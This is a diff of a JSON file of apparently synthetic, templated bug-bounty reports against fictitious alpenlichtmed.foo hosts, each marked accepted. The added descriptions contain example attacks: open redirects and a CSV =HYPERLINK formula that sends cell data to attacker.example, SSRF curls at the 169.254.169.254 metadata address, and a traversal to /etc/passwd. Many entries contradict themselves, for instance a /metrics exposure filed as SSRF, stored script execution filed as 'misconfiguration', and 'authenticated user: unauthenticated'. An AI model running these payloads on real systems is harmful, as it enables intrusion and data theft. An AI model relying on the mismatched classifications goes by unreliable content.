+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenlichtmed.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19473,7 +19618,8 @@
           "offset": "4d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://docs.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19618,7 +19764,8 @@
           "offset": "5d 22h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19732,7 +19879,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -19912,7 +20060,8 @@
           "offset": "4d 15h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -20011,7 +20160,8 @@
           "offset": "14h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.alpenlichtmed.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20110,7 +20260,8 @@
           "offset": "3d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://docs.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20225,7 +20376,8 @@
           "offset": "5d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20361,7 +20513,8 @@
           "offset": "3d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenlichtmed.foo/api/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20459,7 +20612,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://updates.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20550,7 +20704,8 @@
           "offset": "1d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://updates.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20690,7 +20845,8 @@
           "offset": "5d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20821,7 +20977,8 @@
           "offset": "2d 12h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenlichtmed.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20967,7 +21124,8 @@
           "offset": "5d 14h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21103,7 +21261,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenlichtmed.foo/import`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21231,7 +21390,8 @@
           "offset": "2d 13h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21362,7 +21522,8 @@
           "offset": "4d 1h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenlichtmed.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21510,7 +21671,8 @@
           "offset": "4d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenlichtmed.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21681,7 +21843,8 @@
           "offset": "8d 17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21763,7 +21926,8 @@
           "offset": "1d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenlichtmed.foo/api/documents/`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21903,7 +22067,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22019,7 +22184,8 @@
           "offset": "2d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.alpenlichtmed.foo/api/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22203,7 +22369,8 @@
           "offset": "6d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22320,7 +22487,8 @@
           "offset": "5d",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22463,7 +22631,8 @@
           "offset": "6d 6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://updates.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22589,7 +22758,8 @@
           "offset": "1d 12h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://updates.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22753,7 +22923,8 @@
           "offset": "6d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://updates.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22884,7 +23055,8 @@
           "offset": "4d 18h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenlichtmed.foo/statements/`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22995,7 +23167,8 @@
           "offset": "2d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23130,7 +23303,8 @@
           "offset": "6d 14h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23282,7 +23456,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -23430,7 +23605,8 @@
           "offset": "8d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
